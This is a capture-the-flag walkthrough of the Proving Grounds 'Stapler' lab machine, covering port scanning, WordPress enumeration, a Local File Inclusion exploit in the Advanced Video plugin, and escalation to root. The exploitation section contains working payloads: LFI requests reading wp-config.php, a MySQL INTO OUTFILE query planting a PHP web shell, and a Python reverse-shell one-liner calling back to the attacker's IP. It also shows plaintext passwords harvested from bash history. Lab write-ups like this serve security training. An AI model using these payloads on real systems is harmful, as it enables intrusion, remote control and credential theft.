---
layout: default
title: Stapler
parent: Proving Grounds Play
nav_order: 27
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.242.148
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-14 21:53 EST
Nmap scan report for 192.168.242.148
Host is up (0.12s latency).
Not shown: 65523 filtered tcp ports (no-response), 4 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE    VERSION
21/tcp    open  ftp        vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.45.217
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh        OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open  tcpwrapped
80/tcp    open  http       PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp   open          Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open  mysql      MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: DontAllowDatabaseTableColumn, Support41Auth, InteractiveClient, ODBCClient, LongP
assword, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, ConnectWithDatabase, FoundRows, Lo
ngColumnFlag, SupportsCompression, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolOl
d, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Y[8>\x7F\x01`]'F_I!i\x01K\x12Q\x1Fy
|_  Auth Plugin Name: mysql_native_password
12380/tcp open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=Red.Initech/organizationName=Initech/stateOrProvinceName=Somewhere in th
e middle of nowhere/countryName=UK
| Not valid before: 2016-06-05T16:34:34
|_Not valid after:  2026-06-03T16:34:34
| tls-alpn:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Tim, we need to-do better next year for Initech
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

# Enumeration

---

## Users

- harry
- elly
- john
- tim
- zoe
- scott

## 21 | FTP

Anonymous logon and exfil _note_ file

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ ftp 192.168.242.148
Connected to 192.168.242.148.
220-
220-|-----------------------------------------------------------------------------------------|
220-| Harry, make sure to update the banner when you get a chance to show who has access here |
220-|-----------------------------------------------------------------------------------------|
220-
220
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ cat note
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, Joh
n.

```

Tried using Hydra to brute force the FTP logon for _elly_ but nothing after about 15 minutes so ended the process.

## 80 | HTTP

![index](../../../assets/images/ctfs/proving_grounds/stapler/index.png)

## 666 | ?

Netcat to banner grab and we get jibberish with the text _message2.jpg_

![gibberish](../../../assets/images/ctfs/proving_grounds/stapler/gibberish.png)

Pipe the data to a file to see if we can get this output in file form.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ nc 192.168.242.148 666 > data

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ file data
data: Zip archive data, at least v2.0 to extract, compression method=deflate

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ mv data data.zip

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ unzip data.zip
Archive:  data.zip
  inflating: message2.jpg
```

![message](../../../assets/images/ctfs/proving_grounds/stapler/message.png)

## 12380 | HTTP

![zoe](../../../assets/images/ctfs/proving_grounds/stapler/zoe.png)

### Run Nikto and Gobuster

Gobuster does not initially return anything.

Running Nikto with the _-ssl_ flag shows an SSL certificate.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ nikto -h http://192.168.242.148:12380 -ssl
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.242.148
+ Target Hostname:    192.168.242.148
+ Target Port:        12380
---------------------------------------------------------------------------
+ SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.lo
calhost
                   Ciphers:  ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to
 put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.lo
calhost
+ Start Time:         2023-11-14 23:27:50 (GMT-5)

```

Rerunning Gobuster with _https_ reveals directories.

```bash
──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ gobuster dir -u https://192.168.218.148:12380 -w /usr/share/wordlists/custom/large_final.txt -x aspx,php,txt,conf -t 80 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://192.168.218.148:12380
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/custom/large_final.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              aspx,php,txt,conf
[+] Timeout:                 10s
===============================================================
2023/11/15 15:34:38 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 306]
/.htpasswd            (Status: 403) [Size: 302]
/.htpasswd.aspx       (Status: 403) [Size: 307]
/.htaccess.php        (Status: 403) [Size: 306]
/.htaccess            (Status: 403) [Size: 302]
/.htaccess.aspx       (Status: 403) [Size: 307]
/.htpasswd.txt        (Status: 403) [Size: 306]
/.htaccess.conf       (Status: 403) [Size: 307]
/.htpasswd.php        (Status: 403) [Size: 306]
/.htpasswd.conf       (Status: 403) [Size: 307]
/announcements        (Status: 301) [Size: 336] [--> https://192.168.218.148:12380/announcements/]
/javascript           (Status: 301) [Size: 333] [--> https://192.168.218.148:12380/javascript/]
/robots.txt           (Status: 200) [Size: 59]
/phpmyadmin           (Status: 301) [Size: 333]
```

_/robots.txt_

![robots](../../../assets/images/ctfs/proving_grounds/stapler/robots.png)

_/blogblog_

Reveals a Wordpress site.

![blog](../../../assets/images/ctfs/proving_grounds/stapler/blog.png)

### WPSCan

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY]
└─$ wpscan --url http://192.168.218.145:12380/blogblog --disable-tls-checks --enumerate p --enumerate t --enumerate u


[+] John Smith
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] john
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] elly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] barry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] peter
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] heather
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] garry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] harry
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] scott
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] kathy
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] tim
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

### Analyze Wordpress Plugins

Manually check the plugins at _/blogblog/wp-content/plugins_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/plugins/ | html2text
****** Index of /blogblog/wp-content/plugins ******
[[ICO]]       Name                        Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                               -  
[[DIR]]       advanced-video-embed-embed-videos-or-playlists/ 2015-10-14 13:52    -  

[[   ]]       hello.php                   2016-06-03 23:40 2.2K  
[[DIR]]       shortcode-ui/               2015-11-12 17:07    -  
[[DIR]]       two-factor/                 2016-04-12 22:56    -  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-vide
os-or-playlists/ | html2text
****** Index of /blogblog/wp-content/plugins/advanced-video-embed-embed-videos-
or-playlists ******
[[ICO]]       Name                     Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                            -  
[[   ]]       advanced_video_embed.php 2015-10-14 13:52 2.4K  
[[DIR]]       inc/                     2015-10-14 13:52    -  
[[TXT]]       readme.txt               2015-10-14 13:52 3.1K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-vide
os-or-playlists/readme.txt | html2text
=== Advanced video embed === Contributors:
arshmultani,meenakshi.php.developer,DScom Donate link: https://www.paypal.com/
cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=Z7C7DNDD9VS3L Tags: advanced
video embed,youtube video embed,auto poster, wordpress youtube playlist
maker,wordpress youtube playlists,wordpress youtube plugin,wordpress youtube
embed,wordpress videos youtube,wordpress youtube video shortcode,wordpress
youtube video as post,video embed , wordpress video embeding plugin, Requires
at least: 3.0.1 Tested up to: 3.3.1 Stable tag: 1.0 Version: 1.0 License: GPLv2
or later License URI: http://www.gnu.org/licenses/gpl-2.0.html Adavnced Video
embed free version supports youtube video embed into your wordpress posts, with
easy to use search panel along side you can also create youtube playlists

```

We see the _Advanced Video_ plugin is version 1.0

### Check searchsploit for Advanced Video 1.0

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ searchsploit advanced video 1.0
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
WordPress Plugin Advanced Video 1.0 - Local File Inclusion            | php/webapps/39646.py
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```

# Exploitation

---

## WordPress Plugin LFI Vuln

The following POC URL is provided in the _39646.py_ exploit.

```bash
POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]
```

This exploit is converting the file we indicate in [FILEPATH] and places at _wp-content/uploads_ with a random title.

Intially looking at _/wp-content/uploads_ we see it is empty.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/ | html2text
****** Index of /blogblog/wp-content/uploads ******
[[ICO]]       Name             Last_modified Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                 -  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380

```

Let's trigger the exploit by reading _wp-config.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k "https://192.168.218.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php"
https://192.168.218.148:12380/blogblog/?p=210

```

Checking _/wp-content/uploads/_ again we now see the JPEG with a random title.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/ | html2text****** Index of /blogblog/wp-content/uploads ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[IMG]]       1621300986.jpeg  2023-11-16 02:13 3.0K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380

```

Download the JPEG and view contents

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/1621300986.jpeg --output wp-con
fig.php

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ cat wp-config.php

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'plbkac');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

We have MySQL DB creds we can use for _root_.

## RCE via MySQL DB File Write

Since we have _root_ credentials to MySQL we should be able to write a file to disk.

Ultimately, we want to write a PHP web shell to the root WWW directory.

To determine the root WWW directory we need to leverate the LFI exploit to get _/etc/apache2/sites-available/default-ssl.conf_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k "https://192.168.218.148:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/apache2/sites-available/default-ssl.conf"
https://192.168.218.148:12380/blogblog/?p=230


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/ | html2text****** Index of /blogblog/wp-content/uploads ******
[[ICO]]       Name             Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                    -  
[[IMG]]       1588528899.jpeg  2023-11-16 02:20 6.2K  
[[IMG]]       1621300986.jpeg  2023-11-16 02:13 3.0K  
===========================================================================
     Apache/2.4.18 (Ubuntu) Server at 192.168.218.148 Port 12380


┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/1588528899.jpeg --output defaul
t-ssl.conf

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ cat default-ssl.conf
<IfModule mod_ssl.c>
        <VirtualHost _default_:12380>
                ServerAdmin garry@red

                DocumentRoot /var/www/https

```

The DocumentRoot is _/var/www/https_

Now we can write a PHP web shell to disk at the path _/var/www/https/blogblog/wp-content/uploads/shell.php_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ mysql -u root -pplbkac -h 192.168.218.148

MySQL [(none)]> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell.php";
Query OK, 1 row affected (0.120 sec)

```

Now test the PHP web shell to make sure we have code execution.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k -s https://192.168.218.148:12380/blogblog/wp-content/uploads/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Generate a Python reverse shell script using _revshellgen_ and URL encode

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ revshellgen -i 192.168.45.217 -p 9001 -t python

[+] Reverse shell command:

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.217",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

```

I used the _urlencoder.org_ site to do the URL encoding.

![encode](../../../assets/images/ctfs/proving_grounds/stapler/encode.png)

Execute the payload and get reverse shell on our netcat listener.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ curl -k "https://192.168.218.148:12380/blogblog/wp-content/uploads/shell.php?cmd=python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%22192.168.45.217%22%2C9001%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%27%20"

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/stapler]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.218.148] 60856
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)


```

# Post-Exploitation

---

## Enumerate User Home Directories

We find the bash history for _JKanode_ is not cleared

```bash
$ cat .bash_history
id
whoami
ls -lah
pwd
ps aux
sshpass -p thisimypassword ssh JKanode@localhost
apt-get install sshpass
sshpass -p JZQuyIN5 ssh peter@localhost
ps -ef
top
kill -9 3747
exit


$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@red:/home/JKanode$ su peter
su peter
Password: JZQuyIN5

red% id
id
uid=1000(peter) gid=1000(peter) groups=1000(peter),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)

```

## Check Sudo Permissions for Peter

We have unrestricted Sudo permissions which allows us to spawn a root shell.

```bash
ed% sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for peter: JZQuyIN5

Matching Defaults entries for peter on red:
    lecture=always, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on red:
    (ALL : ALL) ALL

red% sudo su
sudo su
➜  JKanode id
id
uid=0(root) gid=0(root) groups=0(root)
➜  JKanode whoami
whoami
root

```
